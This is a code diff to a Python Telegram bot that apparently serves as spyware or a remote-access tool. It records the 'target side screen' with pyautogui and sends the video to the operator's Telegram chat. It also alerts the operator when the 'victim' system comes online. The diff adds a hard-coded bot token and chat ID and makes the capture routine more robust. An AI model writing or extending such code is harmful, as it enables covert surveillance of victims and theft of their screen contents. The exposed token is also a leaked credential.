@@ -11,8 +11,8 @@ import numpy as np
 
 
 
-bot=telebot.TeleBot("")
-chatids=[""]
+bot=telebot.TeleBot("7209524999:AAHv_fCjNOCXFCkgPN5O6TzLz-dmIZj9DwA")
+chatids=["2118483701"]
 @bot.message_handler(commands=['start'])
 def start(message):
     # global directory
@@ -318,6 +318,7 @@ def screen(message):
     bot.reply_to(message,"Enter your length of the vido in secs: (example:10)")
     bot.register_next_step_handler(message,recording)
 def recording(message):
+    bot.reply_to(message,"Please Wait.....Target side screen is being captured......")
     try:
         # Specify video resolution (adjust as needed)
         resolution = (1920, 1080)
@@ -326,8 +327,12 @@ def recording(message):
         codec = cv2.VideoWriter_fourcc(*"mp4v")
 
         # Specify output file name
-        filename = "Recording.mp4"
-
+        j=0
+        while True:
+            if not os.path.exists(f"Recording{j}.mp4"):
+                filename = f"Recording{j}.mp4"
+                break
+            j=j+1
         # Specify frames per second (FPS)
         fps = 7.0
 
@@ -340,37 +345,46 @@ def recording(message):
 
         # Start recording
         i=0
-        while True:
-            img = pyautogui.screenshot()
-            frame = np.array(img)
-            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-            out.write(frame)
-            # cv2.imshow("Live", frame)
-            # if cv2.waitKey(1) == ord("q"):
-            if i==float(message.text)*7:
-                break
-            i=i+1
-            time.sleep(1/7)
+        try:
+            while True:
+                img = pyautogui.screenshot()
+                frame = np.array(img)
+                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                out.write(frame)
+                # cv2.imshow("Live", frame)
+                # if cv2.waitKey(1) == ord("q"):
+                if i==float(message.text)*7:
+                    break
+                i=i+1
+                time.sleep(1/7)
+        except:
+            bot.reply_to(message,"May be some frames are dropped due to long length but you won't be dissapointed with the result.....")
 
-        # Release the writer and close all windows
-        out.release()
-        cv2.destroyAllWindows()
-
-        with open("Recording.mp4","rb") as f:
-            bot.send_document(message.chat.id,f)
         bot.reply_to((message,"Successfully Captured Screen....."))
+        
+        # Release the writer and close all windows
+        try:
+            out.release()
+            cv2.destroyAllWindows()
+        except:
+            bot.reply_to(message,"Some technical glitch happended....But don't worry, it will be fixed....Continue using bot......")
+        try:
+            with open("Recording.mp4","rb") as f:
+                bot.send_document(message.chat.id,f)
+        except:
+            bot.reply_to(message,"Recording can't be fetched....Please download manually....")
     except:
-        bot.reply_to(message,"Please enter valid number.")
+        bot.reply_to(message,"Recording can't be done.Please enter valid number or try again....")
 
 #Add below the chatid's to which you wanna forward alart when victic is online.
 for j in chatids:
     bot.send_message(j,"Target system is on......")
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except ConnectionError as e:
-        print(f"Connection error: {e}. Retrying...")
-        # Implement your retry logic here or just pass to retry on the next loop iteration
-    except Exception as e:
-        print(f"An unexpected error occurred: {e}")
-# bot.polling()
+# while True:
+#     try:
+#         bot.polling(none_stop=True)
+#     except ConnectionError as e:
+#         print(f"Connection error: {e}. Retrying...")
+#         # Implement your retry logic here or just pass to retry on the next loop iteration
+#     except Exception as e:
+#         print(f"An unexpected error occurred: {e}")
+bot.polling()
